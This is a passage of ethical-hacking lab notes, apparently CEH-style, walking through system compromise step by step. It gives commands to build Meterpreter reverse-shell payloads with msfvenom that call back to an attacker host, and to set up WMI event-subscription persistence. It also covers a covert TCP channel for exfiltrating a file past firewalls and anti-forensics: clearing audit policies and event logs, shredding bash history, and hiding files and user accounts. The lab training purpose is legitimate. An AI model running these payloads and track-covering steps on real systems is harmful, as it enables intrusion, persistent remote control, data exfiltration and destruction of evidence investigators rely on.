- WMI (Windows Management Instrumentation) event subscription can be utilized for installing event filters, providers, and bindings that execute code when specific events occur. Here, we are exploiting WMI event subscription to gain persistent access to the target system.

##### Steps

- In the terminal, run the following commands:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp Lhost=10.10.1.13 Lport=444 -f exe > Payload.exe
    msfvenom -P windows/meterpreter/reverse_tcp Lhost=10.10.1.13 Lport=444 -f exe > wmi.exe
    ```
- Transfer both payloads to victim machine.
- Use the existing shared folder (/var/www/html/share) or create a new one with appropriate permissions:
    ```bash
    mkdir /var/www/html/share
    chmod -R 755 /var/www/html/share
    chown -R www-data:www-data /var/www/html/share
    ```
- Copy the payloads to the shared folder:
    ```bash
    cp /home/attacker/Desktop/Payload.exe /var/www/html/share/
    cp /home/attacker/Desktop/wmi.exe /var/www/html/share/
    ```
- Start the Apache server: `service apache2 start`
- Launch Metasploit: `msfconsole`
- In Metasploit:
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set Lhost 10.10.1.13
    set Lport 444
    run
    ```
- On the victim machine navigate to `http://10.10.1.13/share` to view the shared folder.
- Download `Payload.exe` and `wmi.exe`.
- Run `Payload.exe` on victim machine. Switch back to attacker machine and observe the opened meterpreter session.
- Type `getuid` to display the current user ID.
- In Metasploit, upload the [WMI-Persistence](https://github.com/n0pe-sled/WMI-Persistence) scripts:
    ```bash
    upload -r Wmi-Persistence C:\\Users\\Administrator\\Downloads
    ```
- Load PowerShell in Metasploit: `load powershell`
- Open PowerShell: `powershell shell`
- In PowerShell, import the WMI-Persistence module:
    ```powershell
    Import-Module ./WMI-Persistence.ps1
    Install-Persistence -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe"
    ```
   - Wait for approximately 5 minutes for the script to execute.
- Open a new terminal with root privileges and launch Metasploit: `msfconsole`
- In Metasploit:
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set Lhost 10.10.1.13
    set Lport 444
    exploit
    ```
- Switch back to the previous terminal, press `Ctrl+C`, type `y` and press `Enter` to exit PowerShell.
- Restart the victim machine. On attacker machine, observe the session closure.
- Once restarted, a new meterpreter session will open. Type `getuid` to display the server username.
- The system now has escalated privileges and persistence, demonstrated by the automatic session creation after a restart.

---
#### Covert Channels using Covert_TCP

- Networks use network access control permissions to permit or deny traffic flowing through them. Tunneling is employed to bypass access control rules of firewalls, IDS, IPS, and web proxies to allow specific traffic. Covert channels can be established by inserting data into unused fields of protocol headers. Numerous unused or misused fields in TCP or IP can be exploited for sending data to bypass firewalls.

- The [Covert_TCP](https://github.com/cudeso/security-tools/blob/master/networktools/covert/covert_tcp.c) program manipulates TCP/IP headers of data packets to send a file one byte at a time from any host to a destination. It can function as a server and client, concealing transmitted data inside an IP header. This is crucial for bypassing firewalls, sending data within legitimate-looking packets that contain no analyzable data for sniffers.

- A professional ethical hacker or pen tester must comprehend how to transmit covert traffic within the unused fields of TCP and IP headers.

##### Steps

lets consider two machines (one Parrot and one Ubuntu)

- **On Parrot**

   - **Prepare Files** 

      - Create a folder named "Send" on the Desktop: `mkdir Send`
      - Change to the Send folder: `cd Send`
      - Create a text file named "message.txt" with the content "Secret Message": `echo "Secret Message" > message.txt`

   - **Download and Compile Covert_TCP**

      - Download [covert_tcp.c](https://github.com/cudeso/security-tools/blob/master/networktools/covert/covert_tcp.c)
      - Paste `covert_tcp.c` into the Send folder.
      - Compile: `cc -o covert_tcp covert_tcp.c`

- **On Ubuntu**

   - **Setup Receiver**

      - Open a new Terminal and create a Receive folder on the Desktop: `cd Desktop && mkdir Receive && cd Receive`

   - **Download and Compile Covert_TCP**

      - Download [covert_tcp.c](https://github.com/cudeso/security-tools/blob/master/networktools/covert/covert_tcp.c)
      - Switch back to Terminal, compile: `cc -o covert_tcp covert_tcp.c`

   - **Transmission (On Ubuntu)**

      - Gain super-user access: `sudo su`
      - Start tcpdump listener: `tcpdump -nvvX port 8888 -i 10`
      - Open a new Terminal tab, navigate to the Receive folder: `cd Desktop/Receive`
      - Start listener: `./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt`

- **On Parrot**

   - **Send Message**

      - Open Wireshark: `Applications -> Pentesting Information Gathering -> Wireshark`
      - Start capturing on the primary network interface.
      - Switch back to Terminal, gain super-user access: `sudo su`
      - Send message: `./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt`

- **On Parrot**

   - **Verify Reception**

      - Observe the message being received in the Terminal.
      - Close tcpdump: `Ctrl+C`
      - Check receive.txt contents: `cat /home/ubuntu/Desktop/Receive/receive.txt`

---

### 4. Clear Logs to Hide the Evidence of Compromise

- Clearing logs is a critical step in the system hacking lifecycle. Attackers, aiming to avoid detection and prosecution, must eliminate any traces of their intrusion. Here, we are focuses on manipulating, disabling, or erasing system logs to remove evidence of unauthorized activities.

##### Techniques for Clearing Logs

- To maintain stealth, intruders employ various techniques to erase evidence of security compromise:

---

| Technique                     | Description                                                                                                            |
|------------------------------|------------------------------------------------------------------------------------------------------------------------|
| Disable Auditing             | Turn off the auditing features of the target system to avoid the recording of security-related activities.               |
| Clearing Logs                 | Remove system log entries associated with security compromise activities, erasing evidence of unauthorized access.        |
| Manipulating Logs             | Modify logs to prevent detection of illegal actions, making it difficult for security analysts to trace the intrusion.   |
| Covering Tracks on the Network| Employ methods like reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and TCP parameter adjustments to hide activities on the network.  |
| Covering Tracks on the OS     | Utilize NTFS streams to hide and cover malicious files within the target system, making them less conspicuous.          |
| Deleting Files                | Use command-line tools like Cipher.exe to delete data, ensuring that it cannot be recovered in the future.             |
| Disabling Windows Functionality | Disable Windows functionalities such as last access timestamp, Hibernation, virtual memory, and system restore points to conceal tracks.  |

---

- The final step in a professional ethical hacker or penetration tester's system hacking process involves removing any tracks or traces of intrusion on the target system. This includes manipulating, disabling, or erasing system logs to avoid detection and prosecution.

---

#### View, Enable, and Clear Audit Policies using Auditpol

- Auditpol.exe is a command-line utility tool used to modify Audit Security settings at the category and sub-category levels.

##### Steps

- View Audit Policies:
   - In the Command Prompt with Administrator privileges, type:
      ```bash
      auditpol /get /category:*
      ```
   - Press Enter to view all audit policies.

- Enable Audit Policies:
   - To enable audit policies for "system" and "account logon," type:
   ```bash
   auditpol /set /category:"system","account logon" /success:enable /failure:enable
   ```
   - Press Enter to apply the changes.

- Check Enabled Policies:
   - To verify the enabled audit policies, type:
   ```bash
   auditpol /get /category:*
   ```
   - Press Enter to check if the policies are enabled.

- Clear Audit Policies:
   - To clear audit policies, type:
   ```bash
   auditpol /clear /y
   ```

- Verify Cleared Policies:
   - To check if the audit policies are cleared, type:
   ```bash
   auditpol /get /category:*
   ```
   - Press Enter to verify that "No Auditing" is indicated.

---

#### Clear Windows Machine Logs using Various Utilities

- The system log files on a Windows machine store crucial information about events, changes, and operations. Here, we use different utilities to clear these logs, maintaining a level of anonymity on the target system.

##### Steps

- **Utilize Clear_Event_Viewer_Logs.bat:**
    - Download and Run [Clear_Event_Viewer_Logs.bat](https://www.tenforums.com/attachments/tutorials/197097d1532546562-clear-all-event-logs-event-viewer-windows-clear_event_viewer_logs.bat).
    - The Command Prompt window will appear, initiating the clearing of event logs.
    - The tool automatically closes the Command Prompt upon completion.
    - Note: This utility, run through command prompt or PowerShell, deletes security, system, and application logs.

- **Use wevtutil to Clear Event Logs:**
    - Open Command Prompt as administrator.
    - Type `wevtutil el` and press Enter to display a list of event logs.
    - Clear a specific event log using `wevtutil cl [log_name]` (e.g., system, application, security).

- **Clear Logs with Cipher:**
    - In Command Prompt with Administrator privileges, type:
      ```bash
      cipher /w:[Drive or Folder or File Location]
      ```
    - Press Enter to overwrite deleted files securely.
    - Cipher.exe overwrites with zeroes, 255s, and random numbers successively.
    - Press `ctrl+c` in the Command Prompt to halt the encryption process.

Here we used various utilities (Clear_Event_Viewer_Logs.bat, wevtutil, and Cipher) to clear Windows machine logs.

---

#### Clear Linux Machine Logs using the BASH Shell

- The BASH (Bourne Again Shell) stores command history in a file, posing a potential risk for attackers. Here we use the BASH shell to clear Linux machine logs, preventing investigators from tracking the attack's origin and understanding the commands used.

##### Steps

- Disable BASH History:
    - In the Terminal window, type:
      ```bash
      export HISTSIZE=0
      ```
      Press Enter to disable saving history.

- Clear Command History:
    - Type:
      ```bash
      history -c
      ```
      Press Enter to clear stored history.
    - Alternatively, use `history -w` to delete the history of the current shell.

- Shred BASH History File:
    - Type:
      ```bash
      shred ~/.bash_history
      ```
      Press Enter to make the history file content unreadable.

- View Shredded History:
    - Type:
      ```bash
      more ~/.bash_history
      ```
      Press Enter to view shredded history content.

- Combine Commands (Optional):
    - Execute the following command to shred, delete, and clear evidence:
      ```bash
      shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit
      ```

---

#### Hiding Artifacts in Windows and Linux Machines

- Artifacts, which contain crucial information about user activities, can be concealed using specific commands in the operating systems. Here, we are hiding directories, files, and user accounts.

##### Windows Machine

- **Create and Hide Directory:**
    - Type:
      ```bash
      mkdir Test
      ```
      Press Enter to create the Test directory.
    - Type:
      ```bash
      attrib +h +s +r Test
      ```
      Press Enter to hide the Test folder.

- **Manage User Accounts:**
    - Type:
      ```bash
      net user Test /add
      ```
      Press Enter to add Test as a user.
    - Type:
      ```bash
      net user Test /active:yes
      ```
      Press Enter to activate the Test account.
    - Type:
      ```bash
      net user Test /active:no
      ```
      Press Enter to hide the Test account.

- This is the process of hiding directories and user accounts in a Windows environment.

##### Linux Machine

- **Create and Hide Files:**
    - Type:
      ```bash
      mkdir Test
      ```
      Press Enter to create the Test directory.
    - Type:
      ```bash
      cd Test
      ```
      Press Enter to navigate into the Test directory.
    - Type:
      ```bash
      touch Sample.txt
      ```
      Press Enter to create Sample.txt.
    - Type:
      ```bash
      touch .Secret.txt
      ```
      Press Enter to create Secret.txt (hidden file).

- **View Hidden Files:**
    - Type:
      ```bash
      ls
      ```
      Press Enter to view only Sample.txt.
    - Type:
      ```bash
      ls -al
      ```
      Press Enter to reveal the hidden Secret.txt.

- This is the process of hiding files in a Linux environment.

---

- Other track-covering tools are [DBAN](https://dban.org), [Privacy Eraser](https://www.cybertronsoft.com), [Wipe](https://privacyroot.com), and [BleachBit](https://www.bleachbit.org) that can be used to clear logs on the target machine.

---
